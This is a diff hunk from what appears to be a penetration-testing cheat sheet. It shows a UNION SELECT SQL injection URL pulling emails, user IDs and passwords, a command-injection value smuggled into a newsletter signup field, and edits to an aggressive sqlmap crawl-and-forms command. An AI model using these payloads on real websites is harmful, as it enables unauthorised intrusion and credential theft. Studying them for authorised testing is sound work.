@@ -58,15 +58,15 @@ http://target.com/article.aspx?article_id=0+UNION+SELECT+EMAIL,+USERID,+PASSWORD
 Newsletter signup > Subscribe:  joe@gmail.com & ipconfig > C:\inetpub\wwwroot\Book\test.txt
 ------------------------------------------------------------------------------------------------------
 
-sqlmap.py -u http://target.com --random-agent --batch --crawl=10 --forms --level=5 --risk=3
+sqlmap.py -u http://target.com --batch --crawl=10 --forms --level=3 --risk=3 --random-agent 
 
--u		      URL
---random-agent
---batch	  Non-interactive mode, this accepts the default answers from sqlmap questions.
---crawl	  How deep you want to crawl the site.
---forms	  Parse and test forms.
---level		 Different levels of tests, 1 is default and 5 is the most.
---risk	   Different risk of tests, 1 is default and 3 is the most.
+-u		             URL
+--batch	         Non-interactive mode, this accepts the default answers from sqlmap questions.
+--crawl	         How deep you want to crawl the site.
+--forms	         Parse and test forms.
+--level		        Different levels of tests, 1 is default and 5 is the most.
+--risk	          Different risk of tests, 1 is default and 3 is the most.
+--random-agent   Use a random user agent ID.
 ------------------------------------------------------------------------------------------------------
 
 Use Burp to trap a request. Copy the request to /root/tmp.
